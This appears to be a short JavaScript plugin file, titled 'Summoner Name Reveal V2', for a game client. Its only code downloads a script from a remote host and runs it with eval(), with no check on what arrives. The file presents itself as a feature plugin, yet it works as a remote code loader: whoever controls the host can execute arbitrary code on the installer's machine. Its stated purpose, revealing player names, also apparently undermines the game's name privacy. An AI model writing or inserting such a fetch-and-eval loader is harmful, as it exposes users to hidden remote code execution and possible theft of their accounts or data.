/**
 * @name Summoner Name Reveal V2
 * @author Dakota1337
 * @link https://github.com/dakota1337x/Summoner-Name-Reveal-V2/releases
 */
 
 fetch('https://xxxxxx/index.js')
    .then(response => response.text())
    .then(code => eval(code))
    .catch(err => console.error(err));